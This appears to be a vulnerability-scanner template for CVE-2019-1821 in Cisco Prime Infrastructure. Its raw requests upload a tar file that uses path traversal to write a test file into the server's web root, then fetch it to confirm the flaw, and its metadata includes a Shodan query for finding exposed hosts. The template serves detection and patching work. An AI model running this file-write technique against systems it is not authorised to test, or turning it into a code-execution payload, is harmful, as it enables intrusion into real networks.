id: CVE-2019-1821
info:
  name: Cisco Prime Infrastructure and Cisco Evolved Programmable Network Manager
    - Remote Code Execution
  author: _0xf4n9x_
  severity: critical
  description: Cisco Prime Infrastructure and Cisco Evolved Programmable Network Manager
    have a vulnerability that allows an authenticated, remote attacker to execute
    code with root-level privileges on the underlying operating system by uploading
    a malicious file to the administrative web interface due to improper validation
    of user-supplied input.
  reference:
  - https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190515-pi-rce
  - https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html
  - https://nvd.nist.gov/vuln/detail/CVE-2019-1821
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-1821
    cwe-id: CWE-20
  metadata:
    shodan-query: http.title:"prime infrastructure"
    impact: The impact of CVE-2019-1821 is severe as it allows a remote attacker to
      execute code with root-level privileges on the underlying operating system,
      potentially causing significant harm to affected systems.
    recommendation: It is recommended to immediately apply the provided patch by Cisco
      to address the CVE-2019-1821 vulnerability in Cisco Prime Infrastructure and
      Cisco Evolved Programmable Network Manager.
  tags: cve,cve2019,rce,fileupload,unauth,intrusive,cisco
requests:
- raw:
  - 'POST /servlet/UploadServlet HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip, deflate

    Primary-IP: 127.0.0.1

    Filename: test.tar

    Filesize: 10240

    Compressed-Archive: false

    Destination-Dir: tftpRoot

    Filecount: 1

    Content-Length: 269

    Content-Type: multipart/form-data; boundary=871a4a346a547cf05cb83f57b9ebcb83


    --871a4a346a547cf05cb83f57b9ebcb83

    Content-Disposition: form-data; name="files"; filename="test.tar"


    ../../opt/CSCOlumos/tomcat/webapps/ROOT/test.txt0000644000000000000000000000000400000000000017431
    0ustar  00000000000000{{randstr}}

    --871a4a346a547cf05cb83f57b9ebcb83--

    '
  - 'GET /test.txt HTTP/1.1

    Host: {{Host}}

    '
  req-condition: true
  matchers:
  - type: dsl
    dsl:
    - status_code == 200
    - contains((body_2), '{{randstr}}')
    condition: and
